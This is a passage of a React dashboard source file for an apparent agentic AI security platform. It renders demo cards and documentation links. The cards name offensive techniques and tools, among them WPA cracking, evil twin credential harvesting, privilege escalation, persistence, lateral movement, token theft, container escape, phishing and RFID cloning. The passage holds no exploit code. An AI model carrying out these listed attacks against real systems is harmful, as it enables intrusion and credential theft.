                <span className="stat-label">Success Rate</span>
              </div>
            </div>
            
            <div className="demo-grid">
              {chaosData.experiments.map((exp: any, i: number) => (
                <div key={i} className="demo-card">
                  <h3>{exp.name}</h3>
                  <p>Target: {exp.target}</p>
                  <div className={`demo-status ${exp.status}`}>
                    {exp.status === 'running' && <Activity className="pulse" size={16} />}
                    {exp.status === 'completed' && <CheckCircle size={16} />}
                    {exp.status === 'scheduled' && <Clock size={16} />}
                    <span>{exp.status.toUpperCase()}</span>
                  </div>
                  {exp.resiliency_score && (
                    <div className="metric">
                      <span>Resiliency Score: {exp.resiliency_score}</span>
                    </div>
                  )}
                </div>
              ))}
            </div>
          </>
        ) : (
          <p>Loading chaos data...</p>
        )}
      </div>

      {/* KaliAgent Demos */}
      <div className="section">
        <h2>⚔️ KaliAgent Live Demos</h2>
        {kaliExamples ? (
          <div className="demo-grid">
            {kaliExamples.examples.map((example: any, i: number) => (
              <div key={i} className="demo-card">
                <h3>{example.name}</h3>
                <p>{example.description}</p>
                <div className="demo-tools">
                  <strong>Tools:</strong> {example.tools.join(', ')}
                </div>
                <div className="demo-meta">
                  <span>⏱️ {example.duration}</span>
                  <span>🔐 {example.authorization}</span>
                </div>
                <button 
                  className="btn primary" 
                  onClick={() => runDemo(example.playbook)}
                  disabled={activeDemo !== null}
                >
                  {activeDemo === example.playbook ? '⏳ Running...' : '▶️ Run Demo'}
                </button>
              </div>
            ))}
          </div>
        ) : (
          <p>Loading KaliAgent examples...</p>
        )}
      </div>

      {/* Agent Simulation Demos */}
      <div className="section">
        <h2>🤖 Agent Simulation Demos</h2>
        <div className="demo-grid">
          <div className="demo-card">
            <h3>🛡️ SOC Alert Triage</h3>
            <p>Real-time security operations center alert handling</p>
            <div className="demo-meta">
              <span>⏱️ ~2 minutes</span>
              <span>🔐 BASIC</span>
            </div>
            <button 
              className="btn primary" 
              onClick={() => runDemo('soc_alert')}
              disabled={activeDemo !== null}
            >
              ▶️ Run Demo
            </button>
          </div>

          <div className="demo-card">
            <h3>🔍 Vulnerability Scan</h3>
            <p>Complete vulnerability lifecycle assessment</p>
            <div className="demo-meta">
              <span>⏱️ ~3 minutes</span>
              <span>🔐 BASIC</span>
            </div>
            <button 
              className="btn primary" 
              onClick={() => runDemo('vuln_scan')}
              disabled={activeDemo !== null}
            >
              ▶️ Run Demo
            </button>
          </div>

          <div className="demo-card">
            <h3>⚔️ RedTeam Engagement</h3>
            <p>Full kill chain penetration test simulation</p>
            <div className="demo-meta">
              <span>⏱️ ~5 minutes</span>
              <span>🔐 ADVANCED</span>
            </div>
            <button 
              className="btn primary" 
              onClick={() => runDemo('redteam')}
              disabled={activeDemo !== null}
            >
              ▶️ Run Demo
            </button>
          </div>

          <div className="demo-card">
            <h3>🦠 Malware Analysis</h3>
            <p>Reverse engineering and behavioral analysis</p>
            <div className="demo-meta">
              <span>⏱️ ~4 minutes</span>
              <span>🔐 ADVANCED</span>
            </div>
            <button 
              className="btn primary" 
              onClick={() => runDemo('malware_analysis')}
              disabled={activeDemo !== null}
            >
              ▶️ Run Demo
            </button>
          </div>

          <div className="demo-card">
            <h3>☁️ Cloud Security Audit</h3>
            <p>Multi-cloud CSPM assessment (AWS/Azure/GCP)</p>
            <div className="demo-meta">
              <span>⏱️ ~3 minutes</span>
              <span>🔐 BASIC</span>
            </div>
            <button 
              className="btn primary" 
              onClick={() => runDemo('cloud_audit')}
              disabled={activeDemo !== null}
            >
              ▶️ Run Demo
            </button>
          </div>

          <div className="demo-card">
            <h3>🚨 Incident Response</h3>
            <p>Ransomware detection and auto-containment</p>
            <div className="demo-meta">
              <span>⏱️ ~2 minutes</span>
              <span>🔐 CRITICAL</span>
            </div>
            <button 
              className="btn primary" 
              onClick={() => runDemo('incident_response')}
              disabled={activeDemo !== null}
            >
              ▶️ Run Demo
            </button>
          </div>
        </div>
      </div>

      {/* Wireless Security Demos */}
      <div className="section">
        <h2>📶 Wireless Security</h2>
        <div className="demo-grid">
          <div className="demo-card">
            <h3>📶 WPA2/WPA3 Cracking</h3>
            <p>Capture handshakes, PMKID attacks, dictionary cracking</p>
            <div className="demo-meta">
              <span>⏱️ ~6 minutes</span>
              <span>📊 Intermediate</span>
            </div>
            <div className="demo-tools">
              <strong>Tools:</strong> Aircrack-ng, hashcat, hcxtools
            </div>
            <button 
              className="btn primary" 
              onClick={() => runDemo('wpa_cracking')}
              disabled={activeDemo !== null}
            >
              ▶️ Run Demo
            </button>
          </div>

          <div className="demo-card">
            <h3>👥 Evil Twin Attack</h3>
            <p>Rogue AP setup, credential harvesting portal</p>
            <div className="demo-meta">
              <span>⏱️ ~8 minutes</span>
              <span>📊 Advanced</span>
            </div>
            <div className="demo-tools">
              <strong>Tools:</strong> hostapd, dnsmasq, bettercap
            </div>
            <button 
              className="btn primary" 
              onClick={() => runDemo('evil_twin')}
              disabled={activeDemo !== null}
            >
              ▶️ Run Demo
            </button>
          </div>

          <div className="demo-card">
            <h3>📶 Bluetooth Reconnaissance</h3>
            <p>BLE device discovery, packet capture, analysis</p>
            <div className="demo-meta">
              <span>⏱️ ~7 minutes</span>
              <span>📊 Intermediate</span>
            </div>
            <div className="demo-tools">
              <strong>Tools:</strong> Ubertooth, btlejack, Wireshark
            </div>
            <button 
              className="btn primary" 
              onClick={() => runDemo('bluetooth_recon')}
              disabled={activeDemo !== null}
            >
              ▶️ Run Demo
            </button>
          </div>
        </div>
      </div>

      {/* Post-Exploitation Demos */}
      <div className="section">
        <h2>🔐 Post-Exploitation</h2>
        <div className="demo-grid">
          <div className="demo-card">
            <h3>🐧 Linux Privilege Escalation</h3>
            <p>Enumerate misconfigs, escalate from www-data to root</p>
            <div className="demo-meta">
              <span>⏱️ ~6 minutes</span>
              <span>📊 Intermediate</span>
            </div>
            <div className="demo-tools">
              <strong>Tools:</strong> LinPEAS, GTFOBins, kernel exploits
            </div>
            <button 
              className="btn primary" 
              onClick={() => runDemo('linux_privesc')}
              disabled={activeDemo !== null}
            >
              ▶️ Run Demo
            </button>
          </div>

          <div className="demo-card">
            <h3>🪟 Windows Privilege Escalation</h3>
            <p>Service misconfigs, token impersonation, UAC bypass</p>
            <div className="demo-meta">
              <span>⏱️ ~6 minutes</span>
              <span>📊 Intermediate</span>
            </div>
            <div className="demo-tools">
              <strong>Tools:</strong> WinPEAS, PowerUp, Juicy Potato
            </div>
            <button 
              className="btn primary" 
              onClick={() => runDemo('windows_privesc')}
              disabled={activeDemo !== null}
            >
              ▶️ Run Demo
            </button>
          </div>

          <div className="demo-card">
            <h3>🔐 Persistence Mechanisms</h3>
            <p>Establish persistent access across reboots</p>
            <div className="demo-meta">
              <span>⏱️ ~5 minutes</span>
              <span>📊 Advanced</span>
            </div>
            <div className="demo-tools">
              <strong>Tools:</strong> Meterpreter, cron, registry, systemd
            </div>
            <button 
              className="btn primary" 
              onClick={() => runDemo('persistence')}
              disabled={activeDemo !== null}
            >
              ▶️ Run Demo
            </button>
          </div>

          <div className="demo-card">
            <h3>🔄 Lateral Movement</h3>
            <p>Pivot through network, compromise additional hosts</p>
            <div className="demo-meta">
              <span>⏱️ ~7 minutes</span>
              <span>📊 Advanced</span>
            </div>
            <div className="demo-tools">
              <strong>Tools:</strong> CrackMapExec, psexec, wmiexec, SSH
            </div>
            <button 
              className="btn primary" 
              onClick={() => runDemo('lateral_movement')}
              disabled={activeDemo !== null}
            >
              ▶️ Run Demo
            </button>
          </div>
        </div>
      </div>

      {/* Forensics & DFIR Demos */}
      <div className="section">
        <h2>🔍 Forensics & DFIR</h2>
        <div className="demo-grid">
          <div className="demo-card">
            <h3>🧠 Memory Forensics</h3>
            <p>Process extraction, malware detection, credential recovery</p>
            <div className="demo-meta">
              <span>⏱️ ~6 minutes</span>
              <span>📊 Advanced</span>
            </div>
            <div className="demo-tools">
              <strong>Tools:</strong> Volatility, Rekall
            </div>
            <button 
              className="btn primary" 
              onClick={() => runDemo('memory_forensics')}
              disabled={activeDemo !== null}
            >
              ▶️ Run Demo
            </button>
          </div>

          <div className="demo-card">
            <h3>📊 Network Forensics</h3>
            <p>PCAP analysis, protocol dissection, IOC extraction</p>
            <div className="demo-meta">
              <span>⏱️ ~5 minutes</span>
              <span>📊 Intermediate</span>
            </div>
            <div className="demo-tools">
              <strong>Tools:</strong> Wireshark, tshark, NetworkMiner
            </div>
            <button 
              className="btn primary" 
              onClick={() => runDemo('network_forensics')}
              disabled={activeDemo !== null}
            >
              ▶️ Run Demo
            </button>
          </div>

          <div className="demo-card">
            <h3>💾 Disk Forensics</h3>
            <p>File recovery, timeline analysis, artifact examination</p>
            <div className="demo-meta">
              <span>⏱️ ~7 minutes</span>
              <span>📊 Advanced</span>
            </div>
            <div className="demo-tools">
              <strong>Tools:</strong> Autopsy, Sleuth Kit, photorec
            </div>
            <button 
              className="btn primary" 
              onClick={() => runDemo('disk_forensics')}
              disabled={activeDemo !== null}
            >
              ▶️ Run Demo
            </button>
          </div>
        </div>
      </div>

      {/* Cloud Security Demos */}
      <div className="section">
        <h2>☁️ Cloud Security</h2>
        <div className="demo-grid">
          <div className="demo-card">
            <h3>🔷 AWS Enumeration & Escalation</h3>
            <p>IAM enumeration, privilege escalation paths, data exfil</p>
            <div className="demo-meta">
              <span>⏱️ ~7 minutes</span>
              <span>📊 Intermediate</span>
            </div>
            <div className="demo-tools">
              <strong>Tools:</strong> Pacu, aws-cli, CloudSploit
            </div>
            <button 
              className="btn primary" 
              onClick={() => runDemo('aws_enum')}
              disabled={activeDemo !== null}
            >
              ▶️ Run Demo
            </button>
          </div>

          <div className="demo-card">
            <h3>🔵 Azure AD Attack Chain</h3>
            <p>Azure AD enumeration, token theft, resource access</p>
            <div className="demo-meta">
              <span>⏱️ ~6 minutes</span>
              <span>📊 Advanced</span>
            </div>
            <div className="demo-tools">
              <strong>Tools:</strong> ROADtools, MSOLSpray, PowerZure
            </div>
            <button 
              className="btn primary" 
              onClick={() => runDemo('azure_ad')}
              disabled={activeDemo !== null}
            >
              ▶️ Run Demo
            </button>
          </div>

          <div className="demo-card">
            <h3>🐳 Container Escape</h3>
            <p>Break out of containers, access host system</p>
            <div className="demo-meta">
              <span>⏱️ ~5 minutes</span>
              <span>📊 Advanced</span>
            </div>
            <div className="demo-tools">
              <strong>Tools:</strong> Docker, kubectl, container escape scripts
            </div>
            <button 
              className="btn primary" 
              onClick={() => runDemo('container_escape')}
              disabled={activeDemo !== null}
            >
              ▶️ Run Demo
            </button>
          </div>
        </div>
      </div>

      {/* Mobile Security Demos */}
      <div className="section">
        <h2>📱 Mobile Security</h2>
        <div className="demo-grid">
          <div className="demo-card">
            <h3>🤖 Android APK Analysis</h3>
            <p>Decompile, analyze, and detect malware in APKs</p>
            <div className="demo-meta">
              <span>⏱️ ~8 minutes</span>
              <span>📊 Intermediate</span>
            </div>
            <div className="demo-tools">
              <strong>Tools:</strong> Apktool, JADX, MobSF, Frida
            </div>
            <button 
              className="btn primary" 
              onClick={() => runDemo('android_apk')}
              disabled={activeDemo !== null}
            >
              ▶️ Run Demo
            </button>
          </div>

          <div className="demo-card">
            <h3>📡 Mobile API Testing</h3>
            <p>Test mobile backend APIs for vulnerabilities</p>
            <div className="demo-meta">
              <span>⏱️ ~7 minutes</span>
              <span>📊 Advanced</span>
            </div>
            <div className="demo-tools">
              <strong>Tools:</strong> Burp Suite, mitmproxy, Postman
            </div>
            <button 
              className="btn primary" 
              onClick={() => runDemo('mobile_api')}
              disabled={activeDemo !== null}
            >
              ▶️ Run Demo
            </button>
          </div>
        </div>
      </div>

      {/* Social Engineering Demos */}
      <div className="section">
        <h2>🎭 Social Engineering</h2>
        <div className="demo-grid">
          <div className="demo-card">
            <h3>🎣 Phishing Campaign</h3>
            <p>Setup and execute phishing campaigns</p>
            <div className="demo-meta">
              <span>⏱️ ~6 minutes</span>
              <span>📊 Intermediate</span>
            </div>
            <div className="demo-tools">
              <strong>Tools:</strong> Gophish, Evilginx, CanPhish
            </div>
            <button 
              className="btn primary" 
              onClick={() => runDemo('phishing')}
              disabled={activeDemo !== null}
            >
              ▶️ Run Demo
            </button>
          </div>

          <div className="demo-card">
            <h3>🔑 RFID Cloning</h3>
            <p>Clone and bypass RFID access controls</p>
            <div className="demo-meta">
              <span>⏱️ ~5 minutes</span>
              <span>📊 Advanced</span>
            </div>
            <div className="demo-tools">
              <strong>Tools:</strong> Proxmark3, ChameleonMini, Flipper Zero
            </div>
            <button 
              className="btn primary" 
              onClick={() => runDemo('rfid_cloning')}
              disabled={activeDemo !== null}
            >
              ▶️ Run Demo
            </button>
          </div>
        </div>
      </div>

      {/* Live Demo Output */}
      {activeDemo && (
        <div className="section">
          <h2>📟 Demo Output</h2>
          <div className="terminal-output">
            {demoOutput.map((line, i) => (
              <div key={i} className="terminal-line">{line}</div>
            ))}
          </div>
          <button className="btn secondary" onClick={() => { setActiveDemo(null); setDemoOutput([]); }}>
            ✕ Close Demo
          </button>
        </div>
      )}
    </div>
  );

  const renderDocs = () => (
    <div className="docs-page">
      <div className="section-header">
        <h1>📖 Documentation</h1>
        <p>Complete guides and API reference</p>
      </div>

      <div className="docs-grid">
        <div className="doc-card">
          <h2>🚀 Quick Start</h2>
          <p>Get up and running in 5 minutes</p>
          <ul>
            <li>Installation guide</li>
            <li>First engagement setup</li>
            <li>Basic configuration</li>
          </ul>
          <a href="/docs/quickstart" className="btn primary">Read Guide →</a>
        </div>

        <div className="doc-card">
          <h2>🛡️ Agent Documentation</h2>
          <p>Detailed agent capabilities and APIs</p>
          <ul>
            <li>SOC Agent</li>
            <li>VulnMan Agent</li>
            <li>RedTeam Agent</li>
            <li>Malware Agent</li>
            <li>Security Agent</li>
            <li>CloudSecurity Agent</li>
          </ul>
          <a href="/api/agents" className="btn primary">View API →</a>
        </div>

        <div className="doc-card">
          <h2>⚔️ KaliAgent Guide</h2>
          <p>Penetration testing automation</p>
          <ul>
            <li>52 Kali tools integration</li>
            <li>5 automated playbooks</li>
            <li>Safety controls</li>
            <li>Report generation</li>
          </ul>
          <a href="/docs/kaliagent" className="btn primary">Read Guide →</a>
        </div>

        <div className="doc-card">
          <h2>📊 API Reference</h2>
          <p>Complete REST API documentation</p>
          <ul>
            <li>Health endpoints</li>
            <li>Agent endpoints</li>
            <li>Metrics endpoints</li>
            <li>WebSocket API</li>
          </ul>
          <a href="/docs" className="btn primary">View Swagger →</a>
        </div>
      </div>
    </div>
  );

  // =============================================================================
  // Main Render
  // =============================================================================

  return (
    <div className="app">
      {/* Navigation */}
      <nav className="navbar">
        <div className="nav-brand">
          <Shield size={32} className="brand-icon" />
          <span>Agentic AI Dashboard</span>
        </div>
        <div className="nav-links">
          <button 
            className={`nav-link ${activeTab === 'overview' ? 'active' : ''}`}
            onClick={() => setActiveTab('overview')}
          >
            📊 Overview
          </button>
          <button 
            className={`nav-link ${activeTab === 'cyber' ? 'active' : ''}`}
            onClick={() => setActiveTab('cyber')}
          >
            🛡️ Cyber Division
          </button>
          <button 
            className={`nav-link ${activeTab === 'demos' ? 'active' : ''}`}
            onClick={() => setActiveTab('demos')}
          >
            🎮 Live Demos
          </button>
          <button 
            className={`nav-link ${activeTab === 'docs' ? 'active' : ''}`}
            onClick={() => setActiveTab('docs')}
          >
            📖 Documentation
          </button>
        </div>
        <div className="nav-status">
          <span className={`websocket-status ${wsConnected ? 'connected' : ''}`}>
            {wsConnected ? '🟢 Live' : '🔴 Disconnected'}
          </span>
        </div>
      </nav>

      {/* Main Content */}
      <main className="main-content">
        {selectedAgent ? renderAgentDrilldown() : (
          <>
            {activeTab === 'overview' && renderOverview()}
            {activeTab === 'cyber' && renderCyberDivision()}
            {activeTab === 'demos' && renderDemos()}
            {activeTab === 'docs' && renderDocs()}
          </>
        )}
      </main>

      {/* Footer */}
      <footer className="footer">
        <p>🍀 Agentic AI Dashboard v2.0 | Quality Score: 9.0/10 | Last Updated: April 18, 2026</p>
        <p>
          <a href="https://github.com/wezzels/agentic-ai">GitHub</a> •
          <a href="https://discord.gg/clawd">Discord</a> •
          <a href="https://papers.stsgym.com/papers/cyber-division/">Documentation</a>
        </p>
      </footer>
    </div>
  );
}

export default App;
